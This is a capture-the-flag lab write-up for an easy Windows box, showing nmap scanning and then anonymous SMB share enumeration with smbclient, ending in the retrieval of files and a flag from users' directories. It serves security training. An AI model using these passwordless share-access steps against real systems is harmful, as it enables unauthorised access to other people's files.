# Box: Dancing
ID: 3
Difficulty: Easy

## 🧠 Attacker Environment
- **Host OS**: Parrot Security OS (VM)

## 🛠️ Tools Used
  - `ping`
  - `nmap`

## 🎯 Target Environment
- **Ip Address**: 10.129.10.250
- **OS**: Windows

## 🧠 Recon
Nmap Scan:
```bash
nmap -sV 10.129.10.250
```
## 🔍 Enumeration
- Found an open port **135/tcp**, running **msrpc** service
- Found an open port **139/tcp**, running **netbios-ssn** service
- Found an open port **445/tcp**, running **microsoft-ds?** service

## 💥 Exploitation
Logged in via SMB:
```bash
smbclient -L 10.129.10.250
```
## Shares Available
- **ADMIN$**: hidden network shares created by Windows NT that allows admins to have remote access to every disk volume on a network-connected system
- **C$** Admin share for the C:\ disk volume
- **IPC$**inter-process communication share (not part of file system)
- **WorkShares$**custom share

## Authentication
````bash
smbclient \\\\10.129.10.250\\ADMIN$ = ❌
smbclient \\\\10.129.10.250\\C$ = ❌
smbclient \\\\10.129.10.250\\WorkShares = ✅ **Success** 
````

## File Discovery
1. Used ls to list all contents of the share:
```bash 
smb: \> ls
```
2. Found two directories:
Amy.J
James.P

3. Navigated into the Amy.J directory and retrieved notes:
```bash 
smb: \> cd Amy.J
smb: \Amy.J\> ls
smb: \Amy.J\> get worknotes.txt
```
4. Went back and accessed James.P:
```bash 
smb: \Amy.J\> cd ..
smb: \> cd James.P
smb: \James.P\> ls
smb: \James.P\> get flag.txt
```
## 🔐 Privilege Escalation
Not required - accessed another user's desktop via SMB

## 🧼 Cleanup & Lessons
- smbclient session closed cleanly
- **Key takeaways**: 
- Enumerate all shares, always try no password
